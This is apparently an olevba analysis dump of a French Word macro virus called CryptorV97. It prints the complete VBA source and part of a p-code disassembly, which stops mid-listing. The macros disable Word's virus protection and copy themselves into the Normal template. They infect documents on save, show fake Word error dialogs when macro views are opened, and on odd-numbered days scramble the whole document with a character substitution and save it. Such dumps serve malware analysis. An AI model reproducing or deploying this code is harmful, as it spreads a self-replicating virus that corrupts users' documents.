olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Cryptor
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Cryptor - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO CryptorV97.bas 
in file: Virus.MSWord.Cryptor - OLE stream: 'Macros/VBA/CryptorV97'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoOpen()
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
Options.SaveNormalPrompt = False
On Error GoTo ErrorAO
iMacroCount = WordBasic.CountMacros(0, 0)
For i = 1 To iMacroCount
    If WordBasic.[MacroName$](i, 0) = "CryptorV97" Then
        CryptorV97Installed = -1
    End If
Next i
If Not CryptorV97Installed Then
    Application.OrganizerCopy Source:=ActiveDocument.FullName, Destination:=NormalTemplate.FullName, Name:="CryptorV97", Object:=wdOrganizerObjectProjectItems
    MsgBox "Attention, modèle normal crypté ????", vbCritical, "Virus CryptorV97"
End If
ErrorAO:
End Sub
Sub AutoClose()
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
Options.SaveNormalPrompt = False
On Error GoTo ErrorAC
Dim MyDate
MyDate = Date
D$ = Mid(MyDate, 1, 2)
Select Case D$
    Case "01", "03", "05", "07", "09", "11", "13", "15", "17", "19", "21", "23", "25", "27", "29", "31"
Selection.WholeStory
StatusBar = "Cryptage du document en cours..., HAHAHAHAHA!!!!!"
For i = 1 To 500000
Next i
With Selection.Find
        .Text = "a"
        .Replacement.Text = "@"
End With
Selection.Find.Execute Replace:=wdReplaceAll
With Selection.Find
        .Text = "b"
        .Replacement.Text = Chr$(1)
End With
Selection.Find.Execute Replace:=wdReplaceAll
With Selection.Find
        .Text = "c"
        .Replacement.Text = Chr$(8)
End With
Selection.Find.Execute Replace:=wdReplaceAll
With Selection.Find
        .Text = "d"
        .Replacement.Text = "("
End With
Selection.Find.Execute Replace:=wdReplaceAll
With Selection.Find
        .Text = "e"
        .Replacement.Text = "+"
End With
Selection.Find.Execute Replace:=wdReplaceAll
With Selection.Find
        .Text = "f"
        .Replacement.Text = "$"
End With
Selection.Find.Execute Replace:=wdReplaceAll
With Selection.Find
        .Text = "g"
        .Replacement.Text = "="
End With
Selection.Find.Execute Replace:=wdReplaceAll
With Selection.Find
        .Text = "h"
        .Replacement.Text = "-"
End With
Selection.Find.Execute Replace:=wdReplaceAll
With Selection.Find
        .Text = "i"
        .Replacement.Text = "}"
End With
Selection.Find.Execute Replace:=wdReplaceAll
With Selection.Find
        .Text = "j"
        .Replacement.Text = "ç"
End With
Selection.Find.Execute Replace:=wdReplaceAll
With Selection.Find
        .Text = "k"
        .Replacement.Text = "#"
End With
Selection.Find.Execute Replace:=wdReplaceAll
With Selection.Find
        .Text = "l"
        .Replacement.Text = "\"
End With
Selection.Find.Execute Replace:=wdReplaceAll
With Selection.Find
        .Text = "m"
        .Replacement.Text = "/"
End With
Selection.Find.Execute Replace:=wdReplaceAll
With Selection.Find
        .Text = "n"
        .Replacement.Text = "~"
End With
Selection.Find.Execute Replace:=wdReplaceAll
With Selection.Find
        .Text = "o"
        .Replacement.Text = "^"
End With
Selection.Find.Execute Replace:=wdReplaceAll
With Selection.Find
        .Text = "p"
        .Replacement.Text = "]"
End With
Selection.Find.Execute Replace:=wdReplaceAll
With Selection.Find
        .Text = "q"
        .Replacement.Text = "°"
End With
Selection.Find.Execute Replace:=wdReplaceAll
With Selection.Find
        .Text = "r"
        .Replacement.Text = "²"
End With
Selection.Find.Execute Replace:=wdReplaceAll
With Selection.Find
        .Text = "s"
        .Replacement.Text = "&"
End With
Selection.Find.Execute Replace:=wdReplaceAll
With Selection.Find
        .Text = "t"
        .Replacement.Text = "|"
End With
Selection.Find.Execute Replace:=wdReplaceAll
With Selection.Find
        .Text = "u"
        .Replacement.Text = "*"
End With
Selection.Find.Execute Replace:=wdReplaceAll
With Selection.Find
        .Text = "v"
        .Replacement.Text = "è"
End With
Selection.Find.Execute Replace:=wdReplaceAll
With Selection.Find
        .Text = "w"
        .Replacement.Text = "!"
End With
Selection.Find.Execute Replace:=wdReplaceAll
With Selection.Find
        .Text = "x"
        .Replacement.Text = ";"
End With
Selection.Find.Execute Replace:=wdReplaceAll
With Selection.Find
        .Text = "y"
        .Replacement.Text = "?"
End With
Selection.Find.Execute Replace:=wdReplaceAll
With Selection.Find
        .Text = "z"
        .Replacement.Text = "§"
End With
Selection.Find.Execute Replace:=wdReplaceAll
With Selection.Find
        .Text = "0"
        .Replacement.Text = "'"
End With
Selection.Find.Execute Replace:=wdReplaceAll
With Selection.Find
        .Text = "1"
        .Replacement.Text = "["
End With
Selection.Find.Execute Replace:=wdReplaceAll
With Selection.Find
        .Text = "2"
        .Replacement.Text = "_"
End With
Selection.Find.Execute Replace:=wdReplaceAll
With Selection.Find
        .Text = "3"
        .Replacement.Text = "`"
End With
Selection.Find.Execute Replace:=wdReplaceAll
With Selection.Find
        .Text = "4"
        .Replacement.Text = "<"
End With
Selection.Find.Execute Replace:=wdReplaceAll
With Selection.Find
        .Text = "5"
        .Replacement.Text = ">"
End With
Selection.Find.Execute Replace:=wdReplaceAll
With Selection.Find
        .Text = "6"
        .Replacement.Text = "©"
End With
Selection.Find.Execute Replace:=wdReplaceAll
With Selection.Find
        .Text = "7"
        .Replacement.Text = "®"
End With
Selection.Find.Execute Replace:=wdReplaceAll
With Selection.Find
        .Text = "8"
        .Replacement.Text = "¤"
End With
Selection.Find.Execute Replace:=wdReplaceAll
With Selection.Find
        .Text = "9"
        .Replacement.Text = "£"
End With
Selection.Find.Execute Replace:=wdReplaceAll
With Selection.Find
        .Text = "."
        .Replacement.Text = "%"
End With
Selection.Find.Execute Replace:=wdReplaceAll
With Selection.Find
        .Text = ","
        .Replacement.Text = "µ"
End With
Selection.Find.Execute Replace:=wdReplaceAll
StatusBar = "Cryptage du document terminé..., HAHAHAHAHAHA!!!!"
For i = 1 To 500000
Next i
ActiveDocument.Save
    End Select
ErrorAC:
ActiveDocument.Save
End Sub
Sub FileSaveAs()
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
Options.SaveNormalPrompt = False
On Error GoTo ErrorFSA
    Dialogs(wdDialogFileSaveAs).Show
    If ActiveDocument.SaveFormat = wdFormatDocument Or ActiveDocument.SaveFormat = wdFormatTemplate Then
        ActiveDocument.SaveAs FileFormat:=wdFormatTemplate
    End If
Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=ActiveDocument.FullName, Name:="CryptorV97", Object:=wdOrganizerObjectProjectItems
MsgBox "ZeMacroKiller98 vous remercie...", vbInformation, "Virus CryptorV97"
ActiveDocument.Save
ErrorFSA:
End Sub
Sub FileTemplates()
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
Options.SaveNormalPrompt = False
On Error GoTo ErrorFT
    MsgBox "Espace pile insuffisant.", vbCritical, "Microsoft Word"
ErrorFT:
End Sub
Sub ToolsMacro()
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
Options.SaveNormalPrompt = False
On Error GoTo ErrorTM
    MsgBox "Fonction Sub non défini", vbCritical, "Microsoft Word"
ErrorTM:
End Sub
Sub ViewVBCode()
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
Options.SaveNormalPrompt = False
On Error GoTo ErrorVVBC
    MsgBox "Ce programme a réalisé une opération illégale et va être interrompu.", vbCritical, "Microsoft Word"
ErrorVVBC:
End Sub
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.Cryptor
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 1192 bytes
' Macros/VBA/CryptorV97 - 18564 bytes
' Line #0:
' 	FuncDefn (Sub AutoOpen())
' Line #1:
' 	Ld wdCancelDisabled 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #2:
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemCall DisableAutoMacros 0x0001 
' Line #3:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #4:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #5:
' 	OnError ErrorAO 
' Line #6:
' 	LitDI2 0x0000 
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemLd CountMacros 0x0002 
' 	St iMacroCount 
' Line #7:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld iMacroCount 
' 	For 
' Line #8:
' 	Ld i 
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemLd [MacroName$] 0x0002 
' 	LitStr 0x000A "CryptorV97"
' 	Eq 
' 	IfBlock 
' Line #9:
' 	LitDI2 0x0001 
' 	UMi 
' 	St CryptorV97Installed 
' Line #10:
' 	EndIfBlock 
' Line #11:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #12:
' 	Ld CryptorV97Installed 
' 	Not 
' 	IfBlock 
' Line #13:
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ParamNamed Destination 
' 	LitStr 0x000A "CryptorV97"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #14:
' 	LitStr 0x0024 "Attention, modèle normal crypté ????"
' 	Ld vbCritical 
' 	LitStr 0x0010 "Virus CryptorV97"
' 	ArgsCall MsgBox 0x0003 
' Line #15:
' 	EndIfBlock 
' Line #16:
' 	Label ErrorAO 
' Line #17:
' 	EndSub 
' Line #18:
' 	FuncDefn (Sub AutoClose())
' Line #19:
' 	Ld wdCancelDisabled 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #20:
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemCall DisableAutoMacros 0x0001 
' Line #21:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #22:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #23:
' 	OnError ErrorAC 
' Line #24:
' 	Dim 
' 	VarDefn MyDate
' Line #25:
' 	Ld Date 
' 	St MyDate 
' Line #26:
' 	Ld MyDate 
' 	LitDI2 0x0001 
' 	LitDI2 0x0002 
' 	ArgsLd Mid$ 0x0003 
' 	St D$ 
' Line #27:
' 	Ld D$ 
' 	SelectCase 
' Line #28:
' 	LitStr 0x0002 "01"
' 	Case 
' 	LitStr 0x0002 "03"
' 	Case 
' 	LitStr 0x0002 "05"
' 	Case 
' 	LitStr 0x0002 "07"
' 	Case 
' 	LitStr 0x0002 "09"
' 	Case 
' 	LitStr 0x0002 "11"
' 	Case 
' 	LitStr 0x0002 "13"
' 	Case 
' 	LitStr 0x0002 "15"
' 	Case 
' 	LitStr 0x0002 "17"
' 	Case 
' 	LitStr 0x0002 "19"
' 	Case 
' 	LitStr 0x0002 "21"
' 	Case 
' 	LitStr 0x0002 "23"
' 	Case 
' 	LitStr 0x0002 "25"
' 	Case 
' 	LitStr 0x0002 "27"
' 	Case 
' 	LitStr 0x0002 "29"
' 	Case 
' 	LitStr 0x0002 "31"
' 	Case 
' 	CaseDone 
' Line #29:
' 	Ld Selection 
' 	ArgsMemCall WholeStory 0x0000 
' Line #30:
' 	LitStr 0x0031 "Cryptage du document en cours..., HAHAHAHAHA!!!!!"
' 	St StatusBar 
' Line #31:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI4 0xA120 0x0007 
' 	For 
' Line #32:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #33:
' 	StartWithExpr 
' 	Ld Selection 
' 	MemLd Find 
' 	With 
' Line #34:
' 	LitStr 0x0001 "a"
' 	MemStWith Then 
' Line #35:
' 	LitStr 0x0001 "@"
' 	MemLdWith Replacement 
' 	MemSt Then 
' Line #36:
' 	EndWith 
' Line #37:
' 	Ld wdReplaceAll 
' 	ParamNamed Replace 
' 	Ld Selection 
' 	MemLd Find 
' 	ArgsMemCall Execute 0x0001 
' Line #38:
' 	StartWithExpr 
' 	Ld Selection 
' 	MemLd Find 
' 	With 
' Line #39:
' 	LitStr 0x0001 "b"
' 	MemStWith Then 
' Line #40:
' 	LitDI2 0x0001 
' 	ArgsLd Chr$ 0x0001 
' 	MemLdWith Replacement 
' 	MemSt Then 
' Line #41:
' 	EndWith 
' Line #42:
' 	Ld wdReplaceAll 
' 	ParamNamed Replace 
' 	Ld Selection 
' 	MemLd Find 
' 	ArgsMemCall Execute 0x0001 
' Line #43:
' 	StartWithExpr 
' 	Ld Selection 
' 	MemLd Find 
' 	With 
' Line #44:
' 	LitStr 0x0001 "c"
' 	MemStWith Then 
' Line #45:
' 	LitDI2 0x0008 
' 	ArgsLd Chr$ 0x0001 
' 	MemLdWith Replacement 
' 	MemSt Then 
' Line #46:
' 	EndWith 
' Line #47:
' 	Ld wdReplaceAll 
' 	ParamNamed Replace 
' 	Ld Selection 
' 	MemLd Find 
' 	ArgsMemCall Execute 0x0001 
' Line #48:
' 	StartWithExpr 
' 	Ld Selection 
' 	MemLd Find 
' 	With 
' Line #49:
' 	LitStr 0x0001 "d"
' 	MemStWith Then 
' Line #50:
' 	LitStr 0x0001 "("
' 	MemLdWith Replacement 
' 	MemSt Then 
' Line #51:
' 	EndWith 
' Line #52:
' 	Ld wdReplaceAll 
' 	ParamNamed Replace 
' 	Ld Selection 
' 	MemLd Find 
' 	ArgsMemCall Execute 0x0001 
' Line #53:
' 	StartWithExpr 
' 	Ld Selection 
' 	MemLd Find 
' 	With 
' Line #54:
' 	LitStr 0x0001 "e"
' 	MemStWith Then 
' Line #55:
' 	LitStr 0x0001 "+"
' 	MemLdWith Replacement 
' 	MemSt Then 
' Line #56:
' 	EndWith 
' Line #57:
' 	Ld wdReplaceAll 
' 	ParamNamed Replace 
' 	Ld Selection 
' 	MemLd Find 
' 	ArgsMemCall Execute 0x0001 
' Line #58:
' 	StartWithExpr 
' 	Ld Selection 
' 	MemLd Find 
' 	With 
' Line #59:
' 	LitStr 0x0001 "f"
' 	MemStWith Then 
' Line #60:
' 	LitStr 0x0001 "$"
' 	MemLdWith Replacement 
' 	MemSt Then 
' Line #61:
' 	EndWith 
' Line #62:
' 	Ld wdReplaceAll 
' 	ParamNamed Replace 
' 	Ld Selection 
' 	MemLd Find 
' 	ArgsMemCall Execute 0x0001 
' Line #63:
' 	StartWithExpr 
' 	Ld Selection 
' 	MemLd Find 
' 	With 
' Line #64:
' 	LitStr 0x0001 "g"
' 	MemStWith Then 
' Line #65:
' 	LitStr 0x0001 "="
' 	MemLdWith Replacement 
' 	MemSt Then 
' Line #66:
' 	EndWith 
' Line #67:
' 	Ld wdReplaceAll 
' 	ParamNamed Replace 
' 	Ld Selection 
' 	MemLd Find 
' 	ArgsMemCall Execute 0x0001 
' Line #68:
' 	StartWithExpr 
' 	Ld Selection 
' 	MemLd Find 
' 	With 
' Line #69:
' 	LitStr 0x0001 "h"
' 	MemStWith Then 
' Line #70:
' 	LitStr 0x0001 "-"
' 	MemLdWith Replacement 
' 	MemSt Then 
' Line #71:
' 	EndWith 
' Line #72:
' 	Ld wdReplaceAll 
' 	ParamNamed Replace 
' 	Ld Selection 
' 	MemLd Find 
' 	ArgsMemCall Execute 0x0001 
' Line #73:
' 	StartWithExpr 
' 	Ld Selection 
' 	MemLd Find 
' 	With 
' Line #74:
' 	LitStr 0x0001 "i"
' 	MemStWith Then 
' Line #75:
' 	LitStr 0x0001 "}"
' 	MemLdWith Replacement 
' 	MemSt Then 
' Line #76:
' 	EndWith 
' Line #77:
' 	Ld wdReplaceAll 
' 	ParamNamed Replace 
' 	Ld Selection 
' 	MemLd Find 
' 	ArgsMemCall Execute 0x0001 
' Line #78:
' 	StartWithExpr 
' 	Ld Selection 
' 	MemLd Find 
' 	With 
' Line #79:
' 	LitStr 0x0001 "j"
' 	MemStWith Then 
' Line #80:
' 	LitStr 0x0001 "ç"
' 	MemLdWith Replacement 
' 	MemSt Then 
' Line #81:
' 	EndWith 
' Line #82:
' 	Ld wdReplaceAll 
' 	ParamNamed Replace 
' 	Ld Selection 
' 	MemLd Find 
' 	ArgsMemCall Execute 0x0001 
' Line #83:
' 	StartWithExpr 
' 	Ld Selection 
' 	MemLd Find 
' 	With 
' Line #84:
' 	LitStr 0x0001 "k"
' 	MemStWith Then 
' Line #85:
' 	LitStr 0x0001 "#"
' 	MemLdWith Replacement 
' 	MemSt Then 
' Line #86:
' 	EndWith 
' Line #87:
' 	Ld wdReplaceAll 
' 	ParamNamed Replace 
' 	Ld Selection 
' 	MemLd Find 
' 	ArgsMemCall Execute 0x0001 
' Line #88:
' 	StartWithExpr 
' 	Ld Selection 
' 	MemLd Find 
' 	With 
' Line #89:
' 	LitStr 0x0001 "l"
' 	MemStWith Then 
' Line #90:
' 	LitStr 0x0001 "\"
' 	MemLdWith Replacement 
' 	MemSt Then 
' Line #91:
' 	EndWith 
' Line #92:
' 	Ld wdReplaceAll 
' 	ParamNamed Replace 
' 	Ld Selection 
' 	MemLd Find 
' 	ArgsMemCall Execute 0x0001 
' Line #93:
' 	StartWithExpr 
' 	Ld Selection 
' 	MemLd Find 
' 	With 
' Line #94:
' 	LitStr 0x0001 "m"
' 	MemStWith Then 
' Line #95:
' 	LitStr 0x0001 "/"
' 	MemLdWith Replacement 
' 	MemSt Then 
' Line #96:
' 	EndWith 
' Line #97:
' 	Ld wdReplaceAll 
' 	ParamNamed Replace 
' 	Ld Selection 
' 	MemLd Find 
' 	ArgsMemCall Execute 0x0001 
' Line #98:
' 	StartWithExpr 
' 	Ld Selection 
' 	MemLd Find 
' 	With 
' Line #99:
' 	LitStr 0x0001 "n"
' 	MemStWith Then 
' Line #100:
' 	LitStr 0x0001 "~"
' 	MemLdWith Replacement 
' 	MemSt Then 
' Line #101:
' 	EndWith 
' Line #102:
' 	Ld wdReplaceAll 
' 	ParamNamed Replace 
' 	Ld Selection 
' 	MemLd Find 
' 	ArgsMemCall Execute 0x0001 
' Line #103:
' 	StartWithExpr 
' 	Ld Selection 
' 	MemLd Find 
' 	With 
' Line #104:
' 	LitStr 0x0001 "o"
' 	MemStWith Then 
' Line #105:
' 	LitStr 0x0001 "^"
' 	MemLdWith Replacement 
' 	MemSt Then 
' Line #106:
' 	EndWith 
' Line #107:
' 	Ld wdReplaceAll 
' 	ParamNamed Replace 
' 	Ld Selection 
' 	MemLd Find 
' 	ArgsMemCall Execute 0x0001 
' Line #108:
' 	StartWithExpr 
' 	Ld Selection 
' 	MemLd Find 
' 	With 
' Line #109:
' 	LitStr 0x0001 "p"
' 	MemStWith Then 
' Line #110:
' 	LitStr 0x0001 "]"
' 	MemLdWith Replacement 
' 	MemSt Then 
' Line #111:
' 	EndWith 
' Line #112:
' 	Ld wdReplaceAll 
' 	ParamNamed Replace 
' 	Ld Selection 
' 	MemLd Find 
' 	ArgsMemCall Execute 0x0001 
' Line #113:
' 	StartWithExpr 
' 	Ld Selection 
' 	MemLd Find 
' 	With 
' Line #114:
' 	LitStr 0x0001 "q"
' 	MemStWith Then 
' Line #115:
' 	LitStr 0x0001 "°"
' 	MemLdWith Replacement 
' 	MemSt Then 
' Line #116:
' 	EndWith 
' Line #117:
' 	Ld wdReplaceAll 
' 	ParamNamed Replace 
' 	Ld Selection 
' 	MemLd Find 
' 	ArgsMemCall Execute 0x0001 
' Line #118:
' 	StartWithExpr 
' 	Ld Selection 
' 	MemLd Find 
' 	With 
' Line #119:
' 	LitStr 0x0001 "r"
' 	MemStWith Then 
' Line #120:
' 	LitStr 0x0001 "²"
' 	MemLdWith Replacement 
' 	MemSt Then 
' Line #121:
' 	EndWith 
' Line #122:
' 	Ld wdReplaceAll 
' 	ParamNamed Replace 
' 	Ld Selection 
' 	MemLd Find 
' 	ArgsMemCall Execute 0x0001 
' Line #123:
' 	StartWithExpr 
' 	Ld Selection 
' 	MemLd Find 
' 	With 
' Line #124:
' 	LitStr 0x0001 "s"
' 	MemStWith Then 
' Line #125:
' 	LitStr 0x0001 "&"
' 	MemLdWith Replacement 
' 	MemSt Then 
' Line #126:
' 	EndWith 
' Line #127:
' 	Ld wdReplaceAll 
' 	ParamNamed Replace 
' 	Ld Selection 
' 	MemLd Find 
' 	ArgsMemCall Execute 0x0001 
' Line #128:
' 	StartWithExpr 
' 	Ld Selection 
' 	MemLd Find 
' 	With 
' Line #129:
' 	LitStr 0x0001 "t"
' 	MemStWith Then 
' Line #130:
' 	LitStr 0x0001 "|"
' 	MemLdWith Replacement 
' 	MemSt Then 
' Line #131:
' 	EndWith 
' Line #132:
' 	Ld wdReplaceAll 
' 	ParamNamed Replace 
' 	Ld Selection 
' 	MemLd Find 
' 	ArgsMemCall Execute 0x0001 
' Line #133:
' 	StartWithExpr 
' 	Ld Selection 
' 	MemLd Find 
' 	With 
' Line #134:
' 	LitStr 0x0001 "u"
' 	MemStWith Then 
' Line #135:
' 	LitStr 0x0001 "*"
' 	MemLdWith Replacement 
' 	MemSt Then 
' Line #136:
' 	EndWith 
' Line #137:
' 	Ld wdReplaceAll 
' 	ParamNamed Replace 
' 	Ld Selection 
' 	MemLd Find 
' 	ArgsMemCall Execute 0x0001 
' Line #138:
' 	StartWithExpr 
' 	Ld Selection 
' 	MemLd Find 
' 	With 
' Line #139:
' 	LitStr 0x0001 "v"
' 	MemStWith Then 
' Line #140:
' 	LitStr 0x0001 "è"
' 	MemLdWith Replacement 
' 	MemSt Then 
' Line #141:
' 	EndWith 
' Line #142:
' 	Ld wdReplaceAll 
' 	ParamNamed Replace 
' 	Ld Selection 
' 	MemLd Find 
' 	ArgsMemCall Execute 0x0001 
' Line #143:
' 	StartWithExpr 
' 	Ld Selection 
' 	MemLd Find 
' 	With 
' Line #144:
' 	LitStr 0x0001 "w"
' 	MemStWith Then 
' Line #145:
' 	LitStr 0x0001 "!"
' 	MemLdWith Replacement 
' 	MemSt Then 
' Line #146:
' 	EndWith 
' Line #147:
' 	Ld wdReplaceAll 
' 	ParamNamed Replace 
' 	Ld Selection 
' 	MemLd Find 
' 	ArgsMemCall Execute 0x0001 
' Line #148:
' 	StartWithExpr 
' 	Ld Selection 
' 	MemLd Find 
' 	With 
' Line #149:
' 	LitStr 0x0001 "x"
' 	MemStWith Then 
' Line #150:
' 	LitStr 0x0001 ";"
' 	MemLdWith Replacement 
' 	MemSt Then 
' Line #151:
' 	EndWith 
' Line #152:
' 	Ld wdReplaceAll 
' 	ParamNamed Replace 
' 	Ld Selection 
' 	MemLd Find 
' 	ArgsMemCall Execute 0x0001 
' Line #153:
' 	StartWithExpr 
' 	Ld Selection 
' 	MemLd Find 
' 	With 
' Line #154:
' 	LitStr 0x0001 "y"
' 	MemStWith Then 
' Line #155:
' 	LitStr 0x0001 "?"
' 	MemLdWith Replacement 
' 	MemSt Then 
' Line #156:
' 	EndWith 
' Line #157:
' 	Ld wdReplaceAll 
' 	ParamNamed Replace 
' 	Ld Selection 
' 	MemLd Find 
' 	ArgsMemCall Execute 0x0001 
' Line #158:
' 	StartWithExpr 
' 	Ld Selection 
' 	MemLd Find 
' 	With 
' Line #159:
' 	LitStr 0x0001 "z"
' 	MemStWith Then 
' Line #160:
' 	LitStr 0x0001 "§"
' 	MemLdWith Replacement 
' 	MemSt Then 
' Line #161:
' 	EndWith 
' Line #162:
' 	Ld wdReplaceAll 
' 	ParamNamed Replace 
' 	Ld Selection 
' 	MemLd Find 
' 	ArgsMemCall Execute 0x0001 
' Line #163:
' 	StartWithExpr 
' 	Ld Selection 
' 	MemLd Find 
' 	With 
' Line #164:
' 	LitStr 0x0001 "0"
' 	MemStWith Then 
' Line #165:
' 	LitStr 0x0001 "'"
' 	MemLdWith Replacement 
' 	MemSt Then 
' Line #166:
' 	EndWith 
' Line #167:
' 	Ld wdReplaceAll 
' 	ParamNamed Replace 
' 	Ld Selection 
' 	MemLd Find 
' 	ArgsMemCall Execute 0x0001 
' Line #168:
' 	StartWithExpr 
' 	Ld Selection 
' 	MemLd Find 
' 	With 
' Line #169:
' 	LitStr 0x0001 "1"
' 	MemStWith Then 
' Line #170:
' 	LitStr 0x0001 "["
' 	MemLdWith Replacement 
' 	MemSt Then 
' Line #171:
' 	EndWith 
' Line #172:
' 	Ld wdReplaceAll 
' 	ParamNamed Replace 
' 	Ld Selection 
' 	MemLd Find 
' 	ArgsMemCall Execute 0x0001 
' Line #173:
' 	StartWithExpr 
' 	Ld Selection 
' 	MemLd Find 
' 	With 
' Line #174:
' 	LitStr 0x0001 "2"
' 	MemStWith Then 
' Line #175:
' 	LitStr 0x0001 "_"
' 	MemLdWith Replacement 
' 	MemSt Then 
' Line #176:
' 	EndWith 
' Line #177:
' 	Ld wdReplaceAll 
' 	ParamNamed Replace 
' 	Ld Selection 
' 	MemLd Find 
' 	ArgsMemCall Execute 0x0001 
' Line #178:
' 	StartWithExpr 
' 	Ld Selection 
' 	MemLd Find 
' 	With 
' Line #179:
' 	LitStr 0x0001 "3"
' 	MemStWith Then 
' Line #180:
' 	LitStr 0x0001 "`"
' 	MemLdWith Replacement 
' 	MemSt Then 
' Line #181:
' 	EndWith 
' Line #182:
' 	Ld wdReplaceAll 
' 	ParamNamed Replace 
' 	Ld Selection 
' 	MemLd Find 
' 	ArgsMemCall Execute 0x0001 
' Line #183:
' 	StartWithExpr 
' 	Ld Selection 
' 	MemLd Find 
' 	With 
' Line #184:
' 	LitStr 0x0001 "4"
' 	MemStWith Then 
' Line #185:
' 	LitStr 0x0001 "<"
' 	MemLdWith Replacement 
' 	MemSt Then 
' Line #186:
' 	EndWith 
' Line #187:
' 	Ld wdReplaceAll 
' 	ParamNamed Replace 
' 	Ld Selection 
' 	MemLd Find 
' 	ArgsMemCall Execute 0x0001 
' Line #188:
' 	StartWithExpr 
' 	Ld Selection 
' 	MemLd Find 
' 	With 
' Line #189:
' 	LitStr 0x0001 "5"
' 	MemStWith Then 
' Line #190:
' 	LitStr 0x0001 ">"
' 	MemLdWith Replacement 
' 	MemSt Then 
' Line #191:
' 	EndWith 
' Line #192:
' 	Ld wdReplaceAll 
' 	ParamNamed Replace 
' 	Ld Selection 
' 	MemLd Find 
' 	ArgsMemCall Execute 0x0001 
' Line #193:
' 	StartWithExpr 
' 	Ld Selection 
' 	MemLd Find 
' 	With 
' Line #194:
' 	LitStr 0x0001 "6"
' 	MemStWith Then 
' Line #195:
' 	LitStr 0x0001 "©"
' 	MemLdWith Replacement 
' 	MemSt Then 
' Line #196:
' 	EndWith 
' Line #197:
' 	Ld wdReplaceAll 
' 	ParamNamed Replace 
' 	Ld Selection 
' 	MemLd Find 
' 	ArgsMemCall Execute 0x0001 
' Line #198:
' 	StartWithExpr 
' 	Ld Selection 
' 	MemLd Find 
' 	With 
' Line #199:
' 	LitStr 0x0001 "7"
' 	MemStWith Then 
' Line #200:
' 	LitStr 0x0001 "®"
' 	MemLdWith Replacement 
' 	MemSt Then 
' Line #201:
' 	EndWith 
' Line #202:
' 	Ld wdReplaceAll 
' 	ParamNamed Replace 
' 	Ld Selection 
' 	MemLd Find 
' 	ArgsMemCall Execute 0x0001 
' Line #203:
' 	StartWithExpr 
' 	Ld Selection 
' 	MemLd Find 
' 	With 
' Line #204:
' 	LitStr 0x0001 "8"
' 	MemStWith Then 
' Line #205:
' 	LitStr 0x0001 "¤"
' 	MemLdWith Replacement 
' 	MemSt Then 
' Line #206:
' 	EndWith 
' Line #207:
' 	Ld wdReplaceAll 
' 	ParamNamed Replace 
' 	Ld Selection 
' 	MemLd Find 
' 	ArgsMemCall Execute 0x0001 
' Line #208:
' 	StartWithExpr 
' 	Ld Selection 
' 	MemLd Find 
' 	With 
' Line #209:
' 	LitStr 0x0001 "9"
' 	MemStWith Then 
' Line #210:
' 	LitStr 0x0001 "£"
' 	MemLdWith Replacement 
' 	MemSt Then 
' Line #211:
' 	EndWith 
' Line #212:
' 	Ld wdReplaceAll 
' 	ParamNamed Replace 
' 	Ld Selection 
' 	MemLd Find 
' 	ArgsMemCall Execute 0x0001 
' Line #213:
' 	StartWithExpr 
' 	Ld Selection 
' 	MemLd Find 
' 	With 
' Line #214:
' 	LitStr 0x0001 "."
' 	MemStWith Then 
' Line #215:
' 	LitStr 0x0001 "%"
' 	MemLdWith Replacement 
' 	MemSt Then 
' Line #216:
' 	EndWith 
' Line #217:
' 	Ld wdReplaceAll 
' 	ParamNamed Replace 
' 	Ld Selection 
' 	MemLd Find 
' 	ArgsMemCall Execute 0x0001 
' Line #218:
' 	StartWithExpr 
' 	Ld Selection 
' 	MemLd Find 
' 	With 
' Line #219:
' 	LitStr 0x0001 ","
' 	MemStWith Then 
' Line #220:
' 	LitStr 0x0001 "µ"
' 	MemLdWith Replacement 
' 	MemSt Then 
' Line #221:
' 	EndWith 
' Line #222:
' 	Ld wdReplaceAll 
' 	ParamNamed Replace 
' 	Ld Selection 
' 	MemLd Find 
' 	ArgsMemCall Execute 0x0001 
' Line #223:
